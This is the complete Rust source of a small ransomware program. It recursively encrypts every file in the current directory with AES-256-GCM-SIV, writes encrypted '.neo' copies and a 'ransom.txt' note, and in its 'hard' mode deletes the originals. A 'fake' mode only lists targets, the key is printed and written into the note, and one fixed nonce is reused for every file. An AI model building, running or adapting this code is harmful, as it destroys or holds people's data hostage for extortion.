use std::fs::File;
use std::fs;
use std::io::{Read, Write};
use std::io;
use std::env;
use std::path::Path;
use walkdir::WalkDir;
use aes_gcm_siv::{
    aead::{Aead, KeyInit, OsRng},
    Aes256GcmSiv, Nonce // Or `Aes128GcmSiv`
};


fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut mode = String::new();
    let extension = "neo";
    
    println!("Select an encryption mode!");
    println!("hard - (Delete original files).");
    println!("soft - (Leave orginal files)");
    println!("fake - (Iterate through directories and files. NO ENCRPTION)");
    println!("Anything else to cancel.");
    println!("Which mode would you like to set?: ");

    io::stdout().flush().unwrap(); //Have to flush to make the buffered write data actually output.

    io::stdin().read_line(&mut mode).expect("Failed to read line");
    match mode.trim() {
        "hard" => println!("Hardmode On | Deleteing Files"),
        "soft" => println!("Softmode On | Not Deleteing Files"),
        "fake" => println!("Fakemode On | Not Encrypting"),
        _ => println!("Being nice like a rabbit."),
   }

    // Generate a random 256-bit (32-byte) key
    let key = Aes256GcmSiv::generate_key(&mut OsRng);
    let cipher = Aes256GcmSiv::new(&key);

    // Generate a random 96-bit (12-byte) nonce
    let nonce = Nonce::from_slice(b"unique nonce");

    //Setup Directories
    let start_dir = env::current_dir()?;
    let current_exe = env::current_exe()?;
    
    //Leave Ransomnote
    let ransom_note_file = File::create(format!("{}\\ransom.txt",start_dir.display()));
    let _ = ransom_note_file?.write_all(format!("Ransom Note: You've been hacked!\nKey:{}\nNonce:{}",hex::encode(key.as_slice()),hex::encode(nonce.as_slice())).as_bytes());

    //Walk the DIR and Encrypt Files
    for entry in WalkDir::new(start_dir){
        println!();
        let entry = entry.unwrap();

        let enc_target_path = entry.path();
        
        if enc_target_path.is_dir() {
            println!("Entering: {} is a dir!", entry.path().display());
        }
        else if enc_target_path == current_exe {
            println!("Friendly Fire: NOT ENCRYPTING OURSELVES");
        }
        else if mode.trim() == "fake"{
            println!("FakeMode | Would Encrypt: {}",entry.path().display());
        }
        else {
            println!("Encryping: {}", entry.path().display());
            
            let mut file_data = File::open(enc_target_path)?;
            let mut plaintext = Vec::new();
            file_data.read_to_end(&mut plaintext)?;
            
            let ciphertext = cipher.encrypt(nonce, plaintext.as_ref()).map_err(|e| format!("Encryption failed: {:?}", e))?;
            let output_file = File::create(Path::new(&format!("{}.{}",enc_target_path.display(),extension)));
            output_file?.write_all(&ciphertext)?;
            if mode.trim() == "hard" {
                //Hardcore mode. Delete Original Files
                println!("Deleteing: {}", enc_target_path.display());
                fs::remove_file(enc_target_path)?;
            }
        }
    }

    // Print key and nonce for decryption (in practice, store securely)
    println!("------------------------------------------------------------");
    println!("Encryption successful!");
    println!("Key (hex encoded) : {}", hex::encode(key.as_slice()));
    println!("Nonce (hex encoded): {}", hex::encode(nonce.as_slice()));
    
    println!("You've just been encryptified. 'y' to end program. Anything else to end program.");
    print!("Would you like to end program: ");
    io::stdout().flush().unwrap(); //Have to flush to make the buffered write data actually output.

    io::stdin().read_line(&mut mode).expect("Failed to read line");
    match mode.trim() {
        "y" => println!("Yup. Ending."),
        _ => panic!("Too bad. Ending."),
   }
    Ok(())
}

